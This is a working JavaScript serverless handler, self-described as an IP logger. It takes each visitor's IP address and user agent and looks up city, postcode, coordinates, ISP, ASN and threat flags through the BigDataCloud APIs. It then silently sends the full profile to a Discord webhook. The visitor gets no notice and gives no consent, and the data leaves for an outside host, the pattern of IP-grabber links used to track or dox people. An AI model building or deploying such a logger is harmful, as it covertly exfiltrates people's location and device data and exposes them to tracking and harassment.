export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    // Get client IP
    let clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    
    // Clean the IP address
    if (clientIP.includes(',')) {
      clientIP = clientIP.split(',')[0].trim();
    }
    
    // Remove IPv6 prefix if present
    clientIP = clientIP.replace(/^::ffff:/, '');
    
    const userAgent = req.headers['user-agent'] || 'Unknown';
    const apiKey = process.env.BIGDATACLOUD_API_KEY || 'demo'; // Use 'demo' for testing
    
    console.log(`Processing request from IP: ${clientIP}`);

    // ========== FETCH ALL BIGDATACLOUD DATA ==========
    
    // 1. Get IP Geolocation Data (Primary API)
    let geoData = {};
    let timezoneData = {};
    let currencyData = {};
    let threatData = {};
    let asnData = {};
    
    try {
      // API 1: IP Geolocation with full details
      console.log('Fetching geolocation data...');
      const geoResponse = await fetch(
        `https://api.bigdatacloud.net/data/ip-geolocation-full?ip=${clientIP}&key=${apiKey}&localityLanguage=en`
      );
      
      if (geoResponse.ok) {
        geoData = await geoResponse.json();
        console.log('Geolocation data received');
      } else {
        // Fallback to basic geolocation if full API fails
        console.log('Full geolocation failed, trying basic...');
        const basicGeo = await fetch(
          `https://api.bigdatacloud.net/data/ip-geolocation?ip=${clientIP}&key=${apiKey}&localityLanguage=en`
        );
        if (basicGeo.ok) {
          geoData = await basicGeo.json();
        }
      }
      
      // 2. Get Timezone Data
      if (geoData.location?.latitude) {
        console.log('Fetching timezone data...');
        const timezoneResponse = await fetch(
          `https://api.bigdatacloud.net/data/timezone-by-location?latitude=${geoData.location.latitude}&longitude=${geoData.location.longitude}&key=${apiKey}&localityLanguage=en`
        );
        if (timezoneResponse.ok) {
          timezoneData = await timezoneResponse.json();
        }
      }
      
      // 3. Get Currency Data
      if (geoData.country?.isoAlpha2) {
        console.log('Fetching currency data...');
        const currencyResponse = await fetch(
          `https://api.bigdatacloud.net/data/currency-by-country?countryCode=${geoData.country.isoAlpha2}&key=${apiKey}`
        );
        if (currencyResponse.ok) {
          currencyData = await currencyResponse.json();
        }
      }
      
      // 4. Get Threat Intelligence Data
      console.log('Fetching threat intelligence data...');
      const threatResponse = await fetch(
        `https://api.bigdatacloud.net/data/threat-intelligence?ip=${clientIP}&key=${apiKey}`
      );
      if (threatResponse.ok) {
        threatData = await threatResponse.json();
      }
      
      // 5. Get ASN/Network Details
      console.log('Fetching ASN data...');
      const asnResponse = await fetch(
        `https://api.bigdatacloud.net/data/asn-info?ip=${clientIP}&key=${apiKey}`
      );
      if (asnResponse.ok) {
        asnData = await asnResponse.json();
      }
      
    } catch (apiError) {
      console.error('BigDataCloud API Error:', apiError.message);
      // Continue with partial data
    }

    // ========== PREPARE COMPREHENSIVE DATA OBJECT ==========
    
    const comprehensiveData = {
      // Basic IP Info
      ip: clientIP,
      userAgent: userAgent,
      timestamp: new Date().toISOString(),
      
      // Geolocation Data
      geolocation: {
        ip: geoData.ip || clientIP,
        continent: geoData.continent || {},
        country: geoData.country || {},
        location: geoData.location || {},
        administrativeArea: geoData.administrativeArea || {},
        place: geoData.place || {},
        postcode: geoData.postcode || {},
        network: geoData.network || {},
        lastUpdated: geoData.lastUpdated || new Date().toISOString()
      },
      
      // Timezone Data
      timezone: timezoneData || {
        ianaTimeZone: 'Unknown',
        localTime: new Date().toISOString(),
        gmtOffset: 0,
        gmtOffsetString: '+00:00'
      },
      
      // Currency Data
      currency: currencyData || {
        iso3: 'USD',
        name: 'US Dollar',
        symbol: '$',
        symbolNative: '$'
      },
      
      // Threat Intelligence
      threatIntelligence: threatData || {
        isKnownAttacker: false,
        isKnownAbuser: false,
        isBogon: false,
        isProxy: false,
        isTor: false,
        isRelay: false,
        isVpn: false,
        threatScore: 0,
        confidence: 0
      },
      
      // ASN/Network Details
      asn: asnData || {
        asn: 'Unknown',
        name: 'Unknown',
        route: 'Unknown',
        domain: 'Unknown'
      },
      
      // Device/Browser Info (extracted from User-Agent)
      deviceInfo: parseUserAgent(userAgent),
      
      // Request Headers (for debugging)
      headers: {
        accept: req.headers.accept,
        'accept-language': req.headers['accept-language'],
        'accept-encoding': req.headers['accept-encoding'],
        'sec-ch-ua': req.headers['sec-ch-ua'],
        'sec-ch-ua-mobile': req.headers['sec-ch-ua-mobile'],
        'sec-ch-ua-platform': req.headers['sec-ch-ua-platform']
      }
    };

    // ========== SEND TO DISCORD WEBHOOK ==========
    
    if (process.env.DISCORD_WEBHOOK_URL) {
      try {
        await sendToDiscord(comprehensiveData);
        console.log('Data sent to Discord successfully');
      } catch (discordError) {
        console.error('Discord webhook error:', discordError.message);
      }
    }

    // ========== RETURN RESPONSE TO CLIENT ==========
    
    res.status(200).json({
      success: true,
      message: "Comprehensive IP data collected successfully",
      data: comprehensiveData
    });

  } catch (error) {
    console.error('Server Error:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      note: "Basic IP information was captured",
      ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress
    });
  }
}

// ========== HELPER FUNCTIONS ==========

function parseUserAgent(userAgent) {
  const ua = userAgent || '';
  
  // Browser detection
  let browser = 'Unknown';
  if (ua.includes('Chrome')) browser = 'Chrome';
  else if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('Safari')) browser = 'Safari';
  else if (ua.includes('Edge')) browser = 'Edge';
  else if (ua.includes('Opera')) browser = 'Opera';
  
  // OS detection
  let os = 'Unknown';
  if (ua.includes('Windows')) os = 'Windows';
  else if (ua.includes('Mac OS')) os = 'Mac OS';
  else if (ua.includes('Linux')) os = 'Linux';
  else if (ua.includes('Android')) os = 'Android';
  else if (ua.includes('iOS')) os = 'iOS';
  
  // Device detection
  let device = 'Desktop';
  if (ua.includes('Mobile')) device = 'Mobile';
  else if (ua.includes('Tablet')) device = 'Tablet';
  
  return {
    browser,
    os,
    device,
    raw: ua.substring(0, 200) + (ua.length > 200 ? '...' : '')
  };
}

async function sendToDiscord(data) {
  const webhookURL = process.env.DISCORD_WEBHOOK_URL;
  
  if (!webhookURL) return;
  
  // Create comprehensive Discord embed
  const embed = {
    embeds: [{
      title: "🌐 COMPLETE VISITOR DATA RECEIVED",
      color: getThreatColor(data.threatIntelligence),
      timestamp: data.timestamp,
      fields: [
        {
          name: "📍 IP ADDRESS",
          value: `\`\`\`${data.ip}\`\`\``,
          inline: false
        },
        {
          name: "🌍 LOCATION",
          value: `**Country:** ${data.geolocation.country.name || 'Unknown'} (${data.geolocation.country.isoAlpha2 || 'XX'})\n**Region:** ${data.geolocation.administrativeArea.name || 'Unknown'}\n**City:** ${data.geolocation.place.city || 'Unknown'}\n**Postal Code:** ${data.geolocation.postcode || 'Unknown'}`,
          inline: true
        },
        {
          name: "📡 NETWORK",
          value: `**ISP:** ${data.geolocation.network.carrier?.name || 'Unknown'}\n**Organization:** ${data.geolocation.network.organisation || 'Unknown'}\n**ASN:** ${data.asn.asn || 'Unknown'}\n**Route:** ${data.asn.route || 'Unknown'}`,
          inline: true
        },
        {
          name: "🕒 TIMEZONE",
          value: `**Zone:** ${data.timezone.ianaTimeZone || 'Unknown'}\n**Local Time:** ${new Date(data.timezone.localTime || Date.now()).toLocaleString()}\n**Offset:** ${data.timezone.gmtOffsetString || '+00:00'}`,
          inline: true
        },
        {
          name: "💰 CURRENCY",
          value: `**Name:** ${data.currency.name || 'Unknown'}\n**Code:** ${data.currency.iso3 || 'XXX'}\n**Symbol:** ${data.currency.symbol || 'Unknown'}`,
          inline: true
        },
        {
          name: "⚠️ THREAT STATUS",
          value: getThreatStatusText(data.threatIntelligence),
          inline: true
        },
        {
          name: "📊 COORDINATES",
          value: `**Latitude:** ${data.geolocation.location.latitude || 0}\n**Longitude:** ${data.geolocation.location.longitude || 0}\n**Accuracy Radius:** ${data.geolocation.location.accuracyRadius || 0} km`,
          inline: true
        },
        {
          name: "🖥️ DEVICE INFO",
          value: `**Browser:** ${data.deviceInfo.browser}\n**OS:** ${data.deviceInfo.os}\n**Device:** ${data.deviceInfo.device}`,
          inline: true
        },
        {
          name: "📄 USER AGENT",
          value: `\`\`\`${data.deviceInfo.raw}\`\`\``,
          inline: false
        },
        {
          name: "📊 ADDITIONAL DATA",
          value: `**Continent:** ${data.geolocation.continent?.name || 'Unknown'}\n**Calling Code:** +${data.geolocation.country.callingCode || 'Unknown'}\n**Is EU:** ${data.geolocation.country.isEU ? 'Yes' : 'No'}\n**Is in Daylight Savings:** ${data.timezone.isDaylightSaving ? 'Yes' : 'No'}`,
          inline: true
        }
      ],
      footer: {
        text: `BigDataCloud IP Logger • Threat Score: ${data.threatIntelligence.threatScore || 0}/100`
      }
    }]
  };
  
  // Send to Discord
  const response = await fetch(webhookURL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
    },
    body: JSON.stringify(embed)
  });
  
  if (!response.ok) {
    throw new Error(`Discord webhook failed: ${response.status}`);
  }
}

function getThreatColor(threatData) {
  if (!threatData) return 0x3498db; // Blue
  
  if (threatData.threatScore >= 70) return 0xff0000; // Red
  if (threatData.threatScore >= 40) return 0xff9900; // Orange
  if (threatData.threatScore >= 20) return 0xffff00; // Yellow
  return 0x00ff00; // Green
}

function getThreatStatusText(threatData) {
  if (!threatData) return "No threat data available";
  
  const threats = [];
  if (threatData.isKnownAttacker) threats.push("Known Attacker");
  if (threatData.isKnownAbuser) threats.push("Known Abuser");
  if (threatData.isProxy) threats.push("Proxy");
  if (threatData.isTor) threats.push("Tor Node");
  if (threatData.isVpn) threats.push("VPN");
  if (threatData.isBogon) threats.push("Bogon IP");
  if (threatData.isRelay) threats.push("Relay");
  
  if (threats.length === 0) {
    return "✅ Clean - No threats detected";
  }
  
  return `🚨 **Threats:** ${threats.join(', ')}\n**Score:** ${threatData.threatScore || 0}/100\n**Confidence:** ${threatData.confidence || 0}%`;
}
